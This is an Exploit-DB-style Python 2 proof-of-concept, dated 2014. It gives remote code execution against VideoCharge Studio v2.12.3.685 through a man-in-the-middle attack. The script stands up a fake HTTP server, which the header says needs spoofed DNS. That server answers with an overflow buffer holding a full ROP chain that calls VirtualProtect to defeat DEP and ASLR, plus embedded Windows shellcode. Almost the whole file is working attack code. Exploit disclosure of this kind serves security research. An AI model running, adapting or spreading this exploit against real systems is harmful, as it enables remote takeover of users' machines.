#!/usr/bin/python
# Exploit Title: VideoCharge Studio v2.12.3.685 GetHttpResponse() MITM Remote Code Execution Exploit (SafeSEH/ASLR/DEP Bypass)
# Version:       v2.12.3.685
# Date:          2014-02-19
# Author:        Julien Ahrens (@MrTuxracer)
# Homepage:      http://www.rcesecurity.com
# Software Link: http://www.videocharge.com
# Tested on:     Win7-GER (DEP enabled)
#
# Howto / Notes:
# Since it's a MITM RCE you need to spoof the DNS Record for www.videocharge.com in order to successfully exploit this vulnerability
#

from socket import *
from struct import pack
from time import sleep
 
host = "192.168.0.1"
port = 80
 
s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] Listening on %d ..." % port
 
cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]
 
# Thanks Giuseppe D'Amore for the amazing shellcode
# http://www.exploit-db.com/exploits/28996/
shellcode = ("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"+
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"+
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"+
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"+
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"+
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"+
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"+
"\x49\x0b\x31\xc0\x51\x50\xff\xd7")

junk0 = "\x90" * 1277
junk1 = "\x90" * 1900
nops="\x90" * 30
jmpesp=pack('<L',0x102340e8) * 5 # jmp esp |  {PAGE_EXECUTE_READ} [cc.dll]

# jump to controlled memory
eip=pack('<L',0x61b84af1) # {pivot 4124 / 0x101c} # ADD ESP,101C # RETN [zlib1.dll]

#
# ROP registers structure:
# EBP - VirtualProtect() call
# ESP - lpAddress
# EBX - dwSize
# EDX - flNewProtect
# ECX - lpflOldProtect
#

# Craft VirtualProtect() call (0x0080D816) via [DE2D66F9 XOR DEADBEEF] and MOV to EBP
rop = pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0xDE2D66F9) # XOR param 1
rop += pack('<L',0x10206ac5) # POP EBX # RETN [cc.dll]
rop += pack('<L',0xDEADBEEF) # XOR param 2
rop += pack('<L',0x1002fb27) # XOR EDI,EBX # ADD DL,BYTE PTR DS:[EAX] # RETN [cc.dll]
rop += pack('<L',0x101f7572) # MOV EAX,EDI # POP EDI # RETN [cc.dll]  
rop += pack('<L',0xDEADBEEF) # Filler
rop += pack('<L',0x101fbc62) # XCHG EAX,EBP # RETN [cc.dll]

# Craft VirtualProtect() dwSize in EAX and MOV to EBX
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x101f2adc) # ADD EAX,500 # RETN [cc.dll]
rop += pack('<L',0x1023ccfb) # XCHG EAX,EBX # RETN [cc.dll] 

# Craft VirtualProtect() flNewProtect in EAX and MOV to EDX
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x102026a1) # ADD EAX,25 # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102026b1) # ADD EAX,3 # RETN [cc.dll]
rop += pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
rop += pack('<L',0x61b90402) # MOV EDX,ECX # RETN [zlib1.dll]

# Put writable offset for VirtualProtect() lpflOldProtect to ECX
rop += pack('<L',0x1020aacf) # POP ECX # RETN [cc.dll]
rop += pack('<L',0x61B96180) # writable location [zlib1.dll]

# POP a value from the stack after PUSHAD and POP value to ESI 
# as a preparation for the VirtualProtect() call
rop += pack('<L',0x61b850a4) # POP ESI # RETN [zlib1.dll]
rop += pack('<L',0x61B96180) # writable location from [zlib1.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]

# Achievement unlocked: PUSHAD
rop += pack('<L',0x101e93d6) # PUSHAD # RETN [cc.dll] 
rop += pack('<L',0x102340c5) # jmp esp |  {PAGE_EXECUTE_READ} [cc.dll]

payload = junk0 + eip + junk1 + rop + jmpesp + nops + shellcode

buffer = "HTTP/1.1 200 OK\r\n"
buffer += "Date: Sat, 09 Feb 2014 13:33:37 GMT\r\n"
buffer += "Server: Apache/2.2.9 (Debian) PHP/5.2.6-1+lenny16 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g\r\n"
buffer += "X-Powered-By: PHP/5.2.6-1+lenny16\r\n"
buffer += "Vary: Accept-Encoding\r\n"
buffer += "Content-Length: 4000\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: text/html\r\n\r\n"
buffer += payload
buffer += "\r\n"
 
print cl.recv(1000)

cl.send(buffer)

print "[+] Sending exploit: OK\n"

sleep(3)
cl.close()
s.close()